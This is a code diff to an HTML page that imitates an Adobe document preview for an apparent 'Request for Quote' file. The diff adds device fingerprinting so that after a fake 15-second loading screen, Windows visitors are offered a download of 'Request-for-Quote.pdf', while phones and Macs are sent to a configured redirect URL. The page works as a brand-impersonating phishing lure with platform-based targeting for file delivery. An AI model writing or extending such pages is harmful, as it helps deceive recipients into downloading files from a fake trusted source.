@@ -354,6 +354,61 @@
         animation: progressFill var(--spin-duration) linear forwards;
       }
 
+      .download-panel {
+        display: grid;
+        width: min(calc(100vw - 2rem), 22rem);
+        justify-items: center;
+        gap: 0.85rem;
+        padding: 1.4rem;
+        text-align: center;
+        background: rgba(255, 255, 255, 0.96);
+        border: 1px solid rgba(222, 222, 222, 0.95);
+        border-radius: 0.85rem;
+        box-shadow: 0 1.5rem 4rem rgba(0, 0, 0, 0.16);
+        animation: fadeIn 0.28s ease both;
+      }
+
+      .download-panel[hidden] {
+        display: none;
+      }
+
+      .download-panel h2,
+      .download-panel p {
+        margin: 0;
+      }
+
+      .download-panel h2 {
+        font-size: 1.08rem;
+        letter-spacing: -0.01em;
+      }
+
+      .download-panel p {
+        color: var(--muted);
+        font-size: 0.94rem;
+        line-height: 1.45;
+      }
+
+      .primary-button {
+        display: inline-flex;
+        min-height: 2.75rem;
+        align-items: center;
+        justify-content: center;
+        padding: 0 1.2rem;
+        color: #fff;
+        font: inherit;
+        font-weight: 700;
+        text-decoration: none;
+        background: var(--adobe-red);
+        border: 0;
+        border-radius: 999px;
+        cursor: pointer;
+      }
+
+      .primary-button:focus,
+      .primary-button:hover {
+        background: #c91517;
+      }
+
       @keyframes spin {
         to {
           transform: rotate(360deg);
@@ -528,11 +583,21 @@
         <p id="redirect-message">Rendering document preview</p>
         <div class="opening-progress" aria-hidden="true"></div>
       </div>
+
+      <section id="download-panel" class="download-panel" aria-labelledby="download-title" hidden>
+        <h2 id="download-title">Document ready</h2>
+        <p>Your PDF is ready to download.</p>
+        <a id="download-link" class="primary-button" href="./Request-for-Quote.pdf" download="Request-for-Quote.pdf">
+          Download PDF
+        </a>
+        <p id="download-status" aria-live="polite" hidden></p>
+      </section>
     </main>
 
     <!--
-      Edit redirectUrl to choose where the page goes after the loading screen.
-      loadingDelayMs controls how long the loading screen stays visible.
+      Phones and Macs open redirectUrl after the loading screen.
+      Windows devices are shown a PDF download link.
+      Keep downloadFileName/downloadPath pointed at a PDF document.
     -->
     <script type="application/json" id="page-config">
       {
@@ -541,6 +606,8 @@
         "logoPath": "./adobe-logo.svg",
         "loadingDelayMs": 15000,
         "redirectUrl": "https://example.com",
+        "downloadFileName": "Request-for-Quote.pdf",
+        "downloadPath": "./Request-for-Quote.pdf",
         "statusMessage": "Rendering document preview"
       }
     </script>
@@ -552,6 +619,10 @@
       const openingFileName = document.querySelector("#opening-file-name");
       const redirectMessage = document.querySelector("#redirect-message");
       const logoImage = document.querySelector("#spinner-logo");
+      const viewerLoading = document.querySelector("#viewer-loading");
+      const downloadPanel = document.querySelector("#download-panel");
+      const downloadLink = document.querySelector("#download-link");
+      const downloadStatus = document.querySelector("#download-status");
 
       const config = JSON.parse(configElement.textContent);
       const configuredCompanyName = config.companyName || "Renovation Sells. RFQ";
@@ -560,6 +631,14 @@
       const loadingDelayMs = Number(config.loadingDelayMs) || 15000;
       const redirectUrl = String(config.redirectUrl || "").trim();
       const redirectMessageText = config.statusMessage || "Rendering document preview";
+      const configuredDownloadFileName = config.downloadFileName || configuredDocumentName;
+      const configuredDownloadPath = config.downloadPath || `./${configuredDownloadFileName}`;
+      const safeDownloadFileName = configuredDownloadFileName.toLowerCase().endsWith(".pdf")
+        ? configuredDownloadFileName
+        : "document.pdf";
+      const safeDownloadPath = configuredDownloadPath.toLowerCase().endsWith(".pdf")
+        ? configuredDownloadPath
+        : `./${safeDownloadFileName}`;
 
       document.documentElement.style.setProperty("--spin-duration", `${loadingDelayMs}ms`);
 
@@ -567,18 +646,55 @@
       topDocumentName.textContent = configuredDocumentName;
       openingFileName.textContent = configuredDocumentName;
       redirectMessage.textContent = redirectMessageText;
+      downloadLink.href = safeDownloadPath;
+      downloadLink.download = safeDownloadFileName;
       logoImage.src = configuredLogoPath;
       logoImage.addEventListener("error", () => {
         logoImage.hidden = true;
       });
 
-      window.setTimeout(() => {
-        if (redirectUrl) {
-          window.location.assign(redirectUrl);
-          return;
-        }
+      if (safeDownloadFileName !== configuredDownloadFileName || safeDownloadPath !== configuredDownloadPath) {
+        downloadStatus.hidden = false;
+        downloadStatus.textContent = "Only PDF downloads are supported by this page.";
+      }
 
-        redirectMessage.textContent = "No redirect URL has been configured.";
+      const getVisitorPlatform = () => {
+        const userAgent = navigator.userAgent || "";
+        const platform = navigator.platform || "";
+        const isPhoneOrTablet = /Android|iPhone|iPad|iPod|Mobile|Tablet/i.test(userAgent);
+        const isMac = /Mac/i.test(platform) || /Macintosh|Mac OS X/i.test(userAgent);
+        const isWindows = /Win/i.test(platform) || /Windows/i.test(userAgent);
+
+        return {
+          shouldRedirectAfterLoading: isPhoneOrTablet || isMac || !isWindows,
+          isWindows,
+        };
+      };
+
+      const finishLoading = () => {
+        viewerLoading.classList.add("fade-out");
+
+        window.setTimeout(() => {
+          viewerLoading.hidden = true;
+
+          if (getVisitorPlatform().shouldRedirectAfterLoading) {
+            if (redirectUrl) {
+              window.location.assign(redirectUrl);
+              return;
+            }
+
+            redirectMessage.textContent = "No destination URL has been configured.";
+            viewerLoading.hidden = false;
+            viewerLoading.classList.remove("fade-out");
+            return;
+          }
+
+          downloadPanel.hidden = false;
+        }, 280);
+      };
+
+      window.setTimeout(() => {
+        finishLoading();
       }, loadingDelayMs);
     </script>
   </body>
